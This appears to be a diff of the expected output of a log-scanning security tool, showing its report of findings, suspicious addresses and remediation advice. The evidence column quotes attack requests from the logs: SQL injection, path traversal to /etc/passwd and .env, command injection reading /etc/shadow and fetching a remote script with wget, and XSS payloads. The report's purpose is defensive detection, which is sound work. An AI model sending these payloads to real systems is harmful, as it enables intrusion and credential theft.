@@ -1,24 +1,66 @@
-Nexo Sentinel
-Scanned 4 files, 35 lines.
-Skipped logs/binary.log: Invalid data: the file "logs/binary.log" is not UTF-8
-Skipped logs/../sentinel.json: outside logs/
-Skipped /etc/passwd: outside logs/
-Findings: 15
-  [high] brute_force logs/attack.log:6 203.0.113.9: 5 failed logins
-  [high] sql_injection logs/attack.log:8 198.51.100.23: GET /products?id=1+UNION+SELECT+name,password+FROM+users 200
-  [high] sql_injection logs/attack.log:9 198.51.100.23: GET /login?user=admin%27--&pass=x 401
-  [medium] path_traversal logs/attack.log:10 198.51.100.77: GET /static/../../etc/passwd 404
-  [medium] sensitive_file logs/attack.log:10 198.51.100.77: GET /static/../../etc/passwd 404
-  [medium] path_traversal logs/attack.log:11 198.51.100.77: GET /download?file=%2e%2e%2f%2e%2e%2fsecrets 403
-  [medium] sensitive_file logs/attack.log:12 198.51.100.77: GET /.env 404
-  [high] sql_injection logs/attack.log:13 192.0.2.10: GET /items?id=5%20or%201=1 200
-  [low] malformed_line logs/attack.log:14 -: 2026-11-02T09:18:00Z not-an-address web GET / 200
-  [low] malformed_line logs/attack.log:15 -: this line is not a log entry
-  [medium] hidden_text logs/unicode.log:3 198.51.100.90: GET /files/invoice<hidden>gpj.exe 200
-  [medium] hidden_text logs/unicode.log:4 198.51.100.90: login accepted user=ad<hidden>min
-  [medium] hidden_text logs/unicode.log:5 198.51.100.90: GET /<control>[2Jcleared 400
-  [medium] hidden_text logs/unicode.log:7 192.0.2.51: GET / 200
-  [low] oversized_line logs/oversized.log:2 -: 6073 characters
-High: 4, medium: 8, low: 3
-Ask the local model for a summary? (yes/no) Addresses to block: ["203.0.113.9", "198.51.100.23"]
-Block them on the firewall? (yes/no) Nothing was changed.
+NEXO SENTINEL - security report of the logs
+
+Scanned 4 files and 56 lines; skipped 3 files.
+Findings: 23 (high 7, medium 13, low 3)
+
+SKIPPED
+  logs/binary.log         Invalid data: the file "logs/binary.log" is not UTF-8
+  logs/../sentinel.json   outside logs/
+  /etc/passwd             outside logs/
+
+FINDINGS
+  SEVERITY  RULE     NAME                  WHERE                  SOURCE           EVIDENCE
+  high      SEN-201  brute_force           logs/attack.log:6      203.0.113.9      5 failed logins
+  high      SEN-101  sql_injection         logs/attack.log:8      198.51.100.23    GET /products?id=1+UNION+SELECT+name,password+FROM+users 200
+  high      SEN-101  sql_injection         logs/attack.log:9      198.51.100.23    GET /login?user=admin%27--&pass=x 401
+  medium    SEN-104  path_traversal        logs/attack.log:10     198.51.100.77    GET /static/../../etc/passwd 404
+  medium    SEN-105  sensitive_file        logs/attack.log:10     198.51.100.77    GET /static/../../etc/passwd 404
+  medium    SEN-104  path_traversal        logs/attack.log:11     198.51.100.77    GET /download?file=%2e%2e%2f%2e%2e%2fsecrets 403
+  medium    SEN-105  sensitive_file        logs/attack.log:12     198.51.100.77    GET /.env 404
+  high      SEN-101  sql_injection         logs/attack.log:13     192.0.2.10       GET /items?id=5%20or%201=1 200
+  low       SEN-303  malformed_line        logs/attack.log:14     -                2026-11-02T09:18:00Z not-an-address web GET / 200
+  low       SEN-303  malformed_line        logs/attack.log:15     -                this line is not a log entry
+  high      SEN-202  login_after_failures  logs/attack.log:16     203.0.113.9      accepted after 6 failed logins: login accepted user=root
+  high      SEN-102  command_injection     logs/attack.log:17     198.51.100.140   GET /ping?host=8.8.8.8;cat+/etc/shadow 200
+  medium    SEN-105  sensitive_file        logs/attack.log:17     198.51.100.140   GET /ping?host=8.8.8.8;cat+/etc/shadow 200
+  high      SEN-102  command_injection     logs/attack.log:18     198.51.100.140   GET /ping?host=x%7Cwget%20http://203.0.113.200/a.sh 200
+  medium    SEN-103  cross_site_scripting  logs/attack.log:19     198.51.100.150   GET /comment?text=%3Cscript%3Ealert(1)%3C/script%3E 200
+  medium    SEN-103  cross_site_scripting  logs/attack.log:20     198.51.100.150   GET /profile?name=<img+src=x+onerror=alert(1)> 200
+  medium    SEN-106  scanner               logs/attack.log:21     198.51.100.160   GET / 200 "sqlmap/1.8.4#stable"
+  medium    SEN-203  enumeration           logs/attack.log:31     198.51.100.170   10 requests answered 404
+  medium    SEN-301  hidden_text           logs/unicode.log:3     198.51.100.90    GET /files/invoice<hidden>gpj.exe 200
+  medium    SEN-301  hidden_text           logs/unicode.log:4     198.51.100.90    login accepted user=ad<hidden>min
+  medium    SEN-301  hidden_text           logs/unicode.log:5     198.51.100.90    GET /<control>[2Jcleared 400
+  medium    SEN-301  hidden_text           logs/unicode.log:7     192.0.2.51       GET / 200
+  low       SEN-302  oversized_line        logs/oversized.log:2   -                6073 characters
+
+SOURCES
+  ADDRESS          SCORE  HIGH  MEDIUM  LOW  PROPOSAL   RULES
+  198.51.100.140   24     2     1       0    block      SEN-102, SEN-105
+  203.0.113.9      20     2     0       0    block      SEN-201, SEN-202
+  198.51.100.23    20     2     0       0    block      SEN-101
+  198.51.100.77    16     0     4       0    watch      SEN-104, SEN-105
+  198.51.100.90    12     0     3       0    watch      SEN-301
+  192.0.2.10       10     1     0       0    protected  SEN-101
+  198.51.100.150   8      0     2       0    watch      SEN-103
+  198.51.100.160   4      0     1       0    watch      SEN-106
+  198.51.100.170   4      0     1       0    watch      SEN-203
+  192.0.2.51       4      0     1       0    watch      SEN-301
+
+RECOMMENDED
+  SEN-101  sql_injection         Review the queries of the endpoint; use parameters, never text put together. (CWE-89, ATT&CK T1190)
+  SEN-102  command_injection     Check the host for commands run by the web service; never pass input to a shell. (CWE-78, ATT&CK T1190)
+  SEN-103  cross_site_scripting  Encode output in the page named; add a Content-Security-Policy. (CWE-79)
+  SEN-104  path_traversal        Resolve file names inside one folder and refuse the rest. (CWE-22)
+  SEN-105  sensitive_file        Make sure the file is not served; rotate any secret that was answered with 200. (CWE-538)
+  SEN-106  scanner               Expect more requests from this address; rate-limit it. (ATT&CK T1595.002)
+  SEN-201  brute_force           Lock the accounts tried and require a second factor. (CWE-307, ATT&CK T1110)
+  SEN-202  login_after_failures  Treat the account as compromised: end its sessions and reset its password. (ATT&CK T1078)
+  SEN-203  enumeration           Rate-limit requests that are answered 404. (ATT&CK T1595.003)
+  SEN-301  hidden_text           Open the line with a tool that shows every character before trusting it. (CWE-117, ATT&CK T1036.002)
+  SEN-302  oversized_line        Limit the length of a request at the proxy. (CWE-400)
+  SEN-303  malformed_line        Check what writes this log; a broken line can hide an entry. (CWE-117)
+
+The report is in report.json.
+Ask the local model for a summary? (yes/no) Proposed: block 198.51.100.140, 203.0.113.9, 198.51.100.23 on the firewall.
+Block them? (yes/no) Nothing was changed.
